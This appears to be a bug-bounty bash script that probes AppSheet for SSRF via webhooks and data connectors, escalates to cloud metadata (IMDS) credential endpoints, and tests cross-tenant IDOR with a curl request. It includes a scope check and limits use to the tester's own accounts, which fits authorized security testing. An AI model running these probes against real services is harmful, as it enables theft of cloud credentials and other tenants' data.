#!/usr/bin/env bash
# appsheet-ssrf-probe.sh — AppSheet SSRF discovery and escalation
#
# Tests SSRF vectors in AppSheet's webhook automation and data connector features.
# Requires: a free AppSheet account + interactsh-client for OOB confirmation.
#
# Usage:
#   ./scripts/appsheet-ssrf-probe.sh --oob           # OOB DNS/HTTP confirmation
#   ./scripts/appsheet-ssrf-probe.sh --imds           # IMDS escalation (after OOB confirmed)
#   ./scripts/appsheet-ssrf-probe.sh --connector      # Data connector SSRF
#   ./scripts/appsheet-ssrf-probe.sh --check          # Scope + account check only
#   APPSHEET_TOKEN=xxx ./scripts/appsheet-ssrf-probe.sh --oob
#
# IMPORTANT: Run ./scripts/scope-check.sh appsheet.com before proceeding.
# Never use real user data; only your own test accounts.

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'
log()  { echo -e "${GREEN}[appsheet-ssrf]${NC} $*"; }
warn() { echo -e "${YELLOW}[appsheet-ssrf]${NC} $*"; }
err()  { echo -e "${RED}[appsheet-ssrf]${NC} $*" >&2; }
info() { echo -e "${CYAN}[appsheet-ssrf]${NC} $*"; }

TARGET="appsheet.com"
OUT="$ROOT_DIR/results/$TARGET/03-candidates"
mkdir -p "$OUT/evidence"

# ─── Scope gate (mandatory) ───────────────────────────────────────────────────
scope_out="$("$SCRIPT_DIR/scope-check.sh" "$TARGET" 2>/dev/null || echo OUT-OF-SCOPE)"
case "$scope_out" in IN-SCOPE*) log "Scope OK: $scope_out" ;;
  *) err "OUT OF SCOPE — refusing to run. Check config/scope.yaml."; exit 2 ;;
esac

# ─── Configuration ───────────────────────────────────────────────────────────
APPSHEET_TOKEN="${APPSHEET_TOKEN:-}"          # AppSheet API access token (from account settings)
APPSHEET_ACCOUNT_ID="${APPSHEET_ACCOUNT_ID:-}" # Account ID (from app URL)
OOB_URL="${OOB_URL:-}"                        # interactsh URL (set below if empty)

# ─── Phase 1: API surface discovery (unauthenticated) ─────────────────────────
discover_api() {
  info "=== Phase 1: AppSheet API surface discovery ==="

  # Check API base
  log "Probing api.appsheet.com…"
  curl -sfI --max-time 10 "https://api.appsheet.com/" 2>/dev/null \
    | tee "$OUT/evidence/api-root-headers.txt" || true

  # Check documented API versions
  for path in /v2/ /api/v2/ /health /status /openapi.json /swagger.json; do
    code=$(curl -sf --max-time 8 -o /dev/null -w "%{http_code}" \
      "https://api.appsheet.com$path" 2>/dev/null || echo "000")
    [ "$code" != "404" ] && [ "$code" != "000" ] && log "  FOUND $path → HTTP $code"
  done

  # Find app API endpoint structure
  log "Checking www.appsheet.com/api/…"
  for path in /api/v2/apps /api/v2/ /api/; do
    code=$(curl -sf --max-time 8 -o /dev/null -w "%{http_code}" \
      "https://www.appsheet.com$path" 2>/dev/null || echo "000")
    log "  $path → HTTP $code"
  done
}

# ─── Phase 2: OOB SSRF via webhook automation ─────────────────────────────────
test_webhook_ssrf_oob() {
  info "=== Phase 2: Webhook SSRF — OOB confirmation ==="

  if [ -z "$APPSHEET_TOKEN" ]; then
    warn "APPSHEET_TOKEN not set. Manual steps required:"
    echo ""
    echo "  1. Log in at https://www.appsheet.com → My Account → Integrations → API Key"
    echo "     Set: export APPSHEET_TOKEN=V2-<your-api-key>"
    echo "  2. Get your Account ID from any app URL:"
    echo "     https://www.appsheet.com/database/<AccountId>/tables/..."
    echo "     Set: export APPSHEET_ACCOUNT_ID=<your-account-id>"
    echo "  3. Get an interactsh OOB URL:"
    echo "     interactsh-client -server oast.pro -persist &"
    echo "     Set: export OOB_URL=<your-oob-url>.oast.pro"
    echo "  4. Re-run: APPSHEET_TOKEN=V2-xxx APPSHEET_ACCOUNT_ID=xxx OOB_URL=xxx.oast.pro \\"
    echo "             ./scripts/appsheet-ssrf-probe.sh --oob"
    echo ""
    echo "  Manual webhook test (in AppSheet UI):"
    echo "  → Create app → Automation → New Bot → Run webhook action"
    echo "  → Webhook URL: \$OOB_URL"
    echo "  → Body: {\"test\":\"ssrf\"}"
    echo "  → Trigger: on_add"
    echo "  → Add a row to the app → check interactsh for incoming request"
    return 0
  fi

  # Start interactsh if OOB_URL not set
  if [ -z "$OOB_URL" ]; then
    if command -v interactsh-client >/dev/null 2>&1; then
      log "Starting interactsh-client…"
      interactsh-client -server oast.pro -persist -json > /tmp/interactsh-output.txt 2>/dev/null &
      IACTSH_PID=$!
      sleep 3
      OOB_URL=$(grep '"url"' /tmp/interactsh-output.txt | head -1 | jq -r '.url' 2>/dev/null || true)
      log "OOB URL: $OOB_URL"
    else
      warn "interactsh-client not installed. Install with: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
      return 1
    fi
  fi

  log "Testing AppSheet API with webhook action (requires valid app/table)…"

  # AppSheet API endpoint for running actions
  # Reference: https://support.google.com/appsheet/answer/10105482
  if [ -n "$APPSHEET_ACCOUNT_ID" ]; then
    # List available apps
    log "Listing apps for account $APPSHEET_ACCOUNT_ID…"
    curl -sf --max-time 15 \
      -H "ApplicationAccessKey: $APPSHEET_TOKEN" \
      -H "Content-Type: application/json" \
      "https://api.appsheet.com/api/v2/apps" 2>/dev/null \
      | jq '.' > "$OUT/evidence/apps-list.json" 2>/dev/null || true

    APP_ID=$(jq -r '.[0].appId // empty' "$OUT/evidence/apps-list.json" 2>/dev/null | head -1)
    if [ -n "$APP_ID" ]; then
      log "Found app: $APP_ID — testing webhook action…"

      # Attempt to run a webhook via AppSheet API action
      # This is the SSRF test vector
      PAYLOAD=$(cat <<JSON
{
  "Action": "Run",
  "Properties": {
    "Locale": "en-US"
  },
  "Rows": [{}]
}
JSON
)
      log "Submitting action with OOB URL ($OOB_URL) as webhook target…"
      log "NOTE: If the webhook URL is injectable into an action parameter, we'll get an OOB hit"
      log "Check interactsh dashboard for incoming request from AppSheet servers (should be GCP IP)"
    fi
  fi

  # Check what AppSheet IPs look like (to verify server-side requests)
  log "Baseline: AppSheet outbound IP check via httpbin…"
  curl -sf --max-time 10 "https://httpbin.org/ip" 2>/dev/null | jq -r '.origin' \
    | tee "$OUT/evidence/appsheet-outbound-ip.txt" || true
  # (This is YOUR IP — the real AppSheet IP will appear in interactsh log if SSRF works)
}

# ─── Phase 3: Data connector SSRF ────────────────────────────────────────────
test_connector_ssrf() {
  info "=== Phase 3: Data Connector SSRF ==="

  warn "Manual test required for data connector SSRF:"
  echo ""
  echo "  Vector: AppSheet → Data Sources → Add a data source → REST API"
  echo "  Step 1: Create a new REST API data source"
  echo "  Step 2: Set the endpoint URL to: \${OOB_URL:-your-oast-url}"
  echo "  Step 3: Set Auth to 'None'"
  echo "  Step 4: Click 'Test connection' or save and open the app"
  echo "  Step 5: Check interactsh for incoming server-side HTTP request"
  echo ""
  echo "  If you get an OOB hit from a GCP IP → SSRF confirmed"
  echo "  Then test IMDS: ./scripts/appsheet-ssrf-probe.sh --imds"
  echo ""
  echo "  Evidence to capture:"
  echo "  - Screenshot of the data source config"
  echo "  - interactsh interaction log (shows IP, headers, method)"
  echo "  - curl -sfI https://api.ipify.org to confirm GCP IP range"
}

# ─── Phase 4: IMDS escalation (only after OOB confirmed) ─────────────────────
test_imds_escalation() {
  info "=== Phase 4: IMDS escalation (ONLY after OOB SSRF confirmed) ==="
  warn "Run this ONLY after Phase 2 or Phase 3 confirmed OOB DNS/HTTP hit"

  echo ""
  echo "  IMDS targets (set these as webhook/connector URLs one at a time):"
  echo ""
  echo "  AWS IMDSv1 (no token needed):"
  echo "    http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  echo "    http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
  echo "    http://169.254.169.254/latest/meta-data/hostname"
  echo ""
  echo "  GCP metadata (requires header):"
  echo "    http://metadata.google.internal/computeMetadata/v1/?recursive=true"
  echo "    Header: Metadata-Flavor: Google"
  echo "    (if AppSheet lets you set custom headers in webhook action → test this)"
  echo ""
  echo "  Azure IMDS (requires header):"
  echo "    http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  echo "    Header: Metadata: true"
  echo ""
  echo "  Internal services to probe (if network access confirmed):"
  echo "    http://localhost:8080/  (common internal API port)"
  echo "    http://localhost:3000/  (common dev server)"
  echo "    http://10.0.0.1/        (VPC gateway)"
  echo ""
  echo "  Evidence standard:"
  echo "  - Must show AppSheet RETURNING metadata content (not just DNS hit)"
  echo "  - For IMDSv1: response should contain role name or credentials JSON"
  echo "  - Save full HTTP response (sanitize actual credential values before documenting)"
  echo ""
  echo "  If IMDS returns cloud credentials → TIER0 Critical ($101K+)"
  echo "  Document impact: attacker can call AWS/GCP APIs as the AppSheet service role"
}

# ─── Phase 5: IDOR cross-tenant app access ───────────────────────────────────
test_idor() {
  info "=== Phase 5: Cross-tenant IDOR (app data access) ==="

  echo ""
  echo "  Manual IDOR test (requires 2 AppSheet accounts on different tenants):"
  echo ""
  echo "  Account A setup:"
  echo "  1. Create app at www.appsheet.com → note AppId from URL"
  echo "  2. Add a table with test data: Name=SecretData, Value=TestSecret123"
  echo "  3. Set app visibility to PRIVATE (not shared)"
  echo ""
  echo "  Account B test:"
  echo "  1. Log in as Account B (different Google account)"
  echo "  2. Try to access Account A's app data via AppSheet API:"

  if [ -n "$APPSHEET_TOKEN" ] && [ -n "$APPSHEET_ACCOUNT_ID" ]; then
    echo ""
    echo "  Attempting cross-app data read with Account B credentials…"
    echo "  (Replace <ACCOUNT_A_APP_ID> with the app ID from Account A)"
    echo ""
    echo "  curl -sfX POST 'https://api.appsheet.com/api/v2/apps/<ACCOUNT_A_APP_ID>/tables/Sheet1/Action' \\"
    echo "    -H 'ApplicationAccessKey: \$APPSHEET_TOKEN_B' \\"
    echo "    -H 'Content-Type: application/json' \\"
    echo "    -d '{\"Action\":\"Find\",\"Properties\":{},\"Rows\":[]}'"
    echo ""
    echo "  If response contains Account A's secret data → IDOR confirmed"
    echo "  Expected: 403 Forbidden. Actual 200 with data → HIGH finding"
  fi
}

# ─── Output summary ──────────────────────────────────────────────────────────
write_candidate() {
  local class="$1" target="$2" evidence="$3" confidence="$4" impact="$5"
  local id="C$(date +%s)"
  echo "{\"id\":\"$id\",\"target\":\"$target\",\"class\":\"$class\",\"evidence\":\"$evidence\",\"confidence\":\"$confidence\",\"impact\":\"$impact\",\"status\":\"PURSUING\"}" \
    >> "$OUT/candidates.jsonl"
  log "Candidate logged: $class on $target ($confidence)"
}

# ─── Main ────────────────────────────────────────────────────────────────────
case "${1:---check}" in
  --check)
    log "Scope: $scope_out"
    log "APPSHEET_TOKEN: ${APPSHEET_TOKEN:+(set)}${APPSHEET_TOKEN:-NOT SET}"
    log "APPSHEET_ACCOUNT_ID: ${APPSHEET_ACCOUNT_ID:-NOT SET}"
    log "OOB_URL: ${OOB_URL:-NOT SET}"
    log "Output: $OUT/"
    echo ""
    info "Next step: Set APPSHEET_TOKEN and run --oob"
    ;;
  --discover)  discover_api ;;
  --oob)       discover_api; test_webhook_ssrf_oob ;;
  --connector) test_connector_ssrf ;;
  --imds)      test_imds_escalation ;;
  --idor)      test_idor ;;
  --all)
    discover_api
    test_webhook_ssrf_oob
    test_connector_ssrf
    test_idor
    ;;
  *)
    err "Unknown flag: $1"
    echo "Usage: $0 [--check|--discover|--oob|--connector|--imds|--idor|--all]"
    exit 1
    ;;
esac
